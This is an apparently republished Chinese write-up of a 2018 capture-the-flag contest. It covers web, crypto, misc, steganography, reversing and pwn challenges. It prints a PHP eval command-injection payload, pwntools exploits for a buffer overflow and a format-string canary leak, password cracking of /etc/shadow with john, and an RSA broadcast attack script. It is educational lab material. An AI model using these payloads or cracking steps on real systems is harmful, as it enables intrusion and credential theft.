> 原文链接: https://www.anquanke.com//post/id/147012 


# 2018开源聚合杯网络空间安全大赛部分题目writeup


                                阅读量   
                                **210065**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t01ddb875ca99026fb7.png)](https://p0.ssl.qhimg.com/t01ddb875ca99026fb7.png)



## 前言

随着网络安全受到持续性关注，攻防演练和攻防成为热点，全国各类不同规模攻防演练的激增，由华安普特与京东安全赞助的开源聚合杯网络空间安全大赛于5月落下帷幕。今天以CTF中各个题型的部分赛题为例，详解打CTF的心里路程与解题思路。其中包含web、隐写、逆向、pwn等多题型。



## WEB

### <a class="reference-link" name="%E6%97%97%E5%B8%9C%E5%8F%98%E9%87%8F"></a>旗帜变量

**题目描述**<br>
flag真的在变量里哦<br>
答题地址：<br>[http://202.98.28.108:10991/uwg8923ybl/](http://202.98.28.108:10991/uwg8923ybl/)

**解析思路**<br>
利用超全局变量GLOBALS<br>
访问首页直接能获取到源代码<br>[![](https://p3.ssl.qhimg.com/t012104e0977ea6c698.png)](https://p3.ssl.qhimg.com/t012104e0977ea6c698.png)此题目考察的是全局变量以及var_dump的问题。我们发现代码中利用正则表达式过滤了大部分可以执行的部分，但是最终args变量带入到了var_dump中，我们可以显示其中的内容。想到了flag变量是被包含进来的，我们可以用GLOBAL变量将其显示，于是最终访问：<br>[http://202.98.28.108:10991/uwg8923ybl/?args=GLOBALS](http://202.98.28.108:10991/uwg8923ybl/?args=GLOBALS)<br>[![](https://p2.ssl.qhimg.com/t012ecce635ba11a3d6.png)](https://p2.ssl.qhimg.com/t012ecce635ba11a3d6.png)获得flag`{`92853051ab894a64f7865cf3c2128b34`}`

### <a class="reference-link" name="%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98"></a>显示问题

**题目描述**<br>
显示内容很丰富哦<br>
答题地址：[http://202.98.28.108:10991/b932hsfgui/](http://202.98.28.108:10991/b932hsfgui/)

**解析思路**<br>
本题目看似与上一个题目相同，但是我们发现其中少了一个$符号，也就是不存在变量名覆盖的问题，我们也就不能够直接定义一个GLOBAL变量来显示flag了。只能另想办法。<br>[![](https://p5.ssl.qhimg.com/t01164133018bba9890.png)](https://p5.ssl.qhimg.com/t01164133018bba9890.png)这里想到可以利用双引号的闭合然后利用eval进行命令注入。<br>
于是传入payload：?hello=1);echo `cat flag.php`;//

成功获得flag<br>[![](https://p2.ssl.qhimg.com/t013d309939027cd219.png)](https://p2.ssl.qhimg.com/t013d309939027cd219.png)记得要查看源代码中才能够看到注释了的flag哦



## CRYPTO

### <a class="reference-link" name="%E4%BA%A4%E6%8D%A2%E5%AF%86%E9%92%A5"></a>交换密钥

**题目描述**<br>
请找到正确的密钥并以格式：flag`{`a,b`}`形式提交<br>
提示：有很多可能性，其中我们需要找到最大的匹配答案提交，并且a和b都小于1000<br>
flag`{`710,808`}`

**解析思路**<br>
在这个题目中，我们需要解决的是小密钥的Diffe-hellman的密钥交换破解问题，正如题目中给出的密钥交换算法中的描述：<br>[![](https://p2.ssl.qhimg.com/t010ebc4a9fdbe66c8e.png)](https://p2.ssl.qhimg.com/t010ebc4a9fdbe66c8e.png)图中展示的是两个人交换密钥的一些参数，我们现在就是一个中间人，截取到了他们两个密钥交换的中间参数。按照Diffie-Hellman的描述，我们只获取中间的参数也就是ga和gb是无法直接求出最终密钥gab的。不过这个题目中给出的参数都很小，我们可以根据题目提示，最大的一组参数暴力破解得到a和b<br>
代码如下：

```
import numpy as np
q=541
g=10

alist=[]
aplus=[]
gaplus=[]
for a in range(1,1000,1):
  if(a&lt;3):
    v=np.power(g,a)%q
    alist.append(v)
  else:
    v=(alist[a-2]*g)%q
    alist.append(v)
  if v==298:
    aplus.append(a)
    gaplus.append(v)


blist=[]
bplus=[]
gbplus=[]
for b in range(1,1000,1):
  if(b&lt;3):
    v=np.power(g,b)%q
    blist.append(v)
  else:
v=(blist[b-2]*g)%q
    blist.append(v)
  if v==330:
    bplus.append(b)
    gbplus.append(v)

gabplus=[]
for i in range(0,len(aplus),1):
  for j in range(0,len(bplus),1):
    for pw in range(1,bplus[j],1):
      if(pw&lt;3):
        v=np.power(gaplus[i],pw)%q
        gabplus.append(v)
      else:
        v=(gabplus[pw-2]*gaplus[i])%q
        gabplus.append(v)
      if(v==399):
        print "flag`{`"+str(aplus[i])+","+str(bplus[j])+"`}`"
```

[![](https://p4.ssl.qhimg.com/t0147ebacc7f03cbccc.png)](https://p4.ssl.qhimg.com/t0147ebacc7f03cbccc.png)所以最终flag为：flag`{`710,808`}`

### <a class="reference-link" name="%E5%AF%86%E9%92%A5%E6%B5%8B%E8%AF%95%EF%BC%9A"></a>密钥测试

**题目描述**<br>
Alice和Bob决定利用抓包的方式测试一下他们之间的通信是否会被泄露。抓取的数据都在日志中了，请查看一下他们的私钥是否存在被破解的危险<br>
答案格式：flag`{`xxxx`}`，不要key=flag`{`bff149a0b87f5b0e00d9dd364e9ddaa0`}`

**解析思路**<br>
在这个题目中，我们获取到一个加密嗅探值sniffer_28394hjkasnf.log，根据题目描述，这个是alice和bob为了测试是否加密参数是否可行的一个值。<br>
根据观察，我们发现其中3个值唯一相同点就是公钥参数E都是3，这是不是类似于共模漏洞也可以攻击呢？<br>
当然可以，用以下脚本，攻击一段时间获取了私钥文件：

```
x1 = 258166178649724503599487742934802526287669691117141193813325965154020153722514921601647187648221919500612597559946901707669147251080002815987547531468665467566717005154808254718275802205355468913739057891997227
x2 = 82342298625679176036356883676775402119977430710726682485896193234656155980362739001985197966750770180888029807855818454089816725548543443170829318551678199285146042967925331334056196451472012024481821115035402
x3 = 22930648200320670438709812150490964905599922007583385162042233495430878700029124482085825428033535726942144974904739350649202042807155611342972937745074828452371571955451553963306102347454278380033279926425450
e = 3

n1 = 770208589881542620069464504676753940863383387375206105769618980879024439269509554947844785478530186900134626128158103023729084548188699148790609927825292033592633940440572111772824335381678715673885064259498347
n2 = 106029085775257663206752546375038215862082305275547745288123714455124823687650121623933685907396184977471397594827179834728616028018749658416501123200018793097004318016219287128691152925005220998650615458757301
n3 = 982308372262755389818559610780064346354778261071556063666893379698883592369924570665565343844555904810263378627630061263713965527697379617881447335759744375543004650980257156437858044538492769168139674955430611


def find_invpow(x, n):
    """Finds the integer component of the n'th root of x,
    an integer such that y ** n &lt;= x &lt; (y + 1) ** n.
    """
    high = 1
    while high ** n &lt; x:
        high *= 2
    low = high / 2
    while low &lt; high:
        mid = (low + high) // 2
        if low &lt; mid and mid ** n &lt; x:
            low = mid
        elif high &gt; mid and mid ** n &gt; x:
            high = mid
        else:
            return mid
    return mid + 1


def chinese_remainder(n, a):
    sum = 0
    prod = reduce(lambda a, b: a * b, n)

    for n_i, a_i in zip(n, a):
        p = prod / n_i
        sum += a_i * mul_inv(p, n_i) * p
    return sum % prod


def mul_inv(a, b):
    b0 = b
    x0, x1 = 0, 1
    if b == 1: return 1
    while a &gt; 1:
        q = a / b
        a, b = b, a % b
        x0, x1 = x1 - q * x0, x0
    if x1 &lt; 0: x1 += b0
    return x1


if __name__ == '__main__':
    n = [n1, n2, n3]
    a = [x1, x2, x3]
    c = chinese_remainder(n, a)
    mCube = c % (n1 * n2 * n3)
    solution = find_invpow(mCube, e)
    # Results
    print solution
    print hex(solution)

    # To check our result
    print solution * solution * solution == mCube
```

[![](https://p5.ssl.qhimg.com/t01019786050b29cccb.png)](https://p5.ssl.qhimg.com/t01019786050b29cccb.png)经过hex转码之后得到真正的flag：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0183daadd37da2fb4c.png)key=bff149a0b87f5b0e00d9dd364e9ddaa0



## MISC

### <a class="reference-link" name="%E6%88%98%E9%98%9F%E5%90%8D"></a>战队名

**题目描述**<br>
一个大佬战队来报名了，他们的给我了一个很长的队员id名单，他们说战队名就在里面…我怎么找不到呢？

**解析思路**<br>
根据题目提示，我们想要把给出的对原名称合起来，并且转换为一组值。先观察name.txt文件，发现最后一行比较奇特：<br>[![](https://p5.ssl.qhimg.com/t0130056b7cf970e27c.png)](https://p5.ssl.qhimg.com/t0130056b7cf970e27c.png)双等号的意思，所以猜测是base64.我们根据“藏头诗”的想法，提取每个名字第一个字符。并且最后追加双等号得到：

```
ZmxhZ3t3aGF0J3NfWW91cl9uYW1lfQ==
```

Base64解密之后得到最终明文：<br>[![](https://p5.ssl.qhimg.com/t01dbcb52dec52e8cb7.png)](https://p5.ssl.qhimg.com/t01dbcb52dec52e8cb7.png)<br>
flag`{`what’s_Your_name`}`

### <a class="reference-link" name="%E5%AF%86%E7%A0%81%E5%92%8C%E7%BA%A6%E7%BF%B0"></a>密码和约翰

**题目描述**<br>
请找到密码相关项就是最终答案，答案格式：flag`{`xxx`}`

**解析思路**

本题目给出了一个linux主机中全部文件，根据提示，使用john（kali中自带安装）破解该主机中的密码，<br>
使用命令：unshadow /etc/passwd /etc/shadow &gt; test_passwd命令创建简单的连接文件。<br>
使用命令：john —wordlist=/usr/share/john/password.lst test_passwd进行密码破解<br>
使用命令：john —show test_passwd查看破解结果<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01cedaa18b4dacb4fc.png)<br>
那么破解了gohan用户密码为dragon1，也就是flag

### <a class="reference-link" name="%E7%AD%BE%E5%88%B0%E9%A2%98"></a>签到题

**题目描述**<br>
抓到了木马文件，但是被杀毒软件查杀了。请恢复签名，并找到ftp传送的文件。

**解析思路**<br>
这是个签名被破坏了的数据包文件，但是不妨碍直接提取字符串。<br>
使用strings（linux下）直接提取字符串,并用grep搜索flag<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f7428fc85d159a17.png)得出flag`{`roses_r_blue_violets_r_r3d_mayb3_harambae_is_not_kill`}`



## STEGA

### <a class="reference-link" name="%E5%A4%BA%E6%97%97%E8%B5%9B"></a>夺旗赛

**题目描述**<br>
旗帜既是flag，答案格式flag`{`xxx`}`<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t014aeeba6d4d0c27cc.png)

**解析思路**

题目给出的影片其实需要搜索的部分是静态部分的画面，我们通过FFmpeg命令将其转换为一帧的静态图片：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a385f90937141926.png)根据提示，需要观察其中的旗子，通过stegsolve发现其实像素中有不同<br>[![](https://p0.ssl.qhimg.com/t01025bcec82ac3637c.png)](https://p0.ssl.qhimg.com/t01025bcec82ac3637c.png)<br>
根据黑色为“0”，白色为“1”提取得到一串二进制：<br>
01100110 01101100 01100001 01100111 01111011 01010011 01110100 01100101 01100111 00110000 01011111 01100110 00110001 01000001 01100111 01011111 01001111 01001011 00100001 01111101<br>
在线转换为字符得到：<br>[https://wishingstarmoye.com/tools/ascii](https://wishingstarmoye.com/tools/ascii)<br>[![](https://p3.ssl.qhimg.com/t019a032a8735c9a8cb.png)](https://p3.ssl.qhimg.com/t019a032a8735c9a8cb.png)flag`{`Steg0_f1Ag_OK!`}`

### <a class="reference-link" name="%E5%A4%A7%E8%84%91%E5%88%87%E7%89%87"></a>大脑切片

**题目描述**<br>
这种透明的图片就是看得人脑壳疼…<br>
答案格式：flag`{`xxx`}`

**解析思路**<br>
图片是一张带有透明度的图片，并且颜色分布无规律的马赛克<br>[![](https://p2.ssl.qhimg.com/t0132f78ff26d172bb8.png)](https://p2.ssl.qhimg.com/t0132f78ff26d172bb8.png)利用alpha.py脚本将alpha通道提取并且根据颜色（rgb，都是16的倍数）进行排序，并当做ascii码转换为字符串，去除小写字母和0后得到一串明文<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015cfbd0f19156880a.png)++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.++++++.—————-.++++++.++++++++++++++++++++.——.——————————————————————————————————.++++++++++++++++++++++++++++++++++++++++++++.+++++++++++++++++++.—————————-.+++++++++++++++++++++.——————.——————————————————————————-.++++++++++++++++++++++++++++++++++++++++++++.+++++++++.————————————————————————————.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++..+++.++++++++.————————————.++++++++++++++.—————————————————————————————.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.+++++++++++++++.<br>
利用brainfuck解密得到flag`{`w3_r_th3_h0llow_m3n`}`



## REVERSE

### <a class="reference-link" name="%E6%B3%A8%E5%86%8C%E7%A0%81"></a>注册码

**题目描述**<br>
注册人flagshop,请找到flagshop的注册码。<br>
flag格式：flag`{`xxx`}`

**解析思路**<br>
IDA中通过shift+f12搜索字符串，找到“密钥无效”等中文信息：<br>[![](https://p1.ssl.qhimg.com/t01ad1b102971f41929.png)](https://p1.ssl.qhimg.com/t01ad1b102971f41929.png)<br>[![](https://p2.ssl.qhimg.com/t0179b2b9e0cf2b90af.png)](https://p2.ssl.qhimg.com/t0179b2b9e0cf2b90af.png)找到调用函数：<br>[![](https://p3.ssl.qhimg.com/t01335f5f8ec73af231.png)](https://p3.ssl.qhimg.com/t01335f5f8ec73af231.png)其中验证函数使用的是sub_4011d0<br>
继续跟进，发现了如下逻辑：<br>[![](https://p4.ssl.qhimg.com/t014371dcf168ec595a.png)](https://p4.ssl.qhimg.com/t014371dcf168ec595a.png)注册码是通过我们输入用户名得到的，而且开头会加上Happy@<br>
所以我们写出逆算法

```
str='flagshop'
flag = 'Happy@'
for i in range(len(str)):
    flag+=chr((i+i*ord(str[i])*ord(str[i]))%66+33)
print flag
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d922e2416c123155.png)<br>
Flag:flag`{` Happy@!R+3G@-D`}`



## PWN

### <a class="reference-link" name="%E4%BD%A0%E7%9F%A5%E9%81%93BOF%E5%90%97%EF%BC%9F"></a>你知道BOF吗？

**题目描述**<br>
nc 202.98.28.108 9897

**解析思路**

```
from pwn import *

useless = 0xABCD1234
offset = 40

payload = "A" * offset + p32(0xABCD1234)

r = remote('202.98.28.108',9897)
r.sendline(payload)
r.interactive()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e103dcbbd5a5c803.png)得出flag`{`what_1s_BOF_you_know_now`}`

### <a class="reference-link" name="%E6%88%91%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2"></a>我的字符串

**题目描述**<br>
nc 202.98.28.108 9896

**解析思路**

带有canary保护，需要先利用printf格式化字符串漏洞获取保护值，再次覆盖地址：

```
from pwn import *

r = remote('202.98.28.108',9896)

func = 0x0804854d
r.sendline('%15$x')
canary = int(r.recv(), 16)

payload = 'A'*40 + p32(canary) + 'B'*12 + p32(func)

r.sendline(payload)
r.interactive()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01fab88fd0ec04f830.png)<br>
得到flag`{`fmt_really_good_for_PWN`}`

锵锵锵，以上是大致解题的思路与过程，欢迎大家交流！
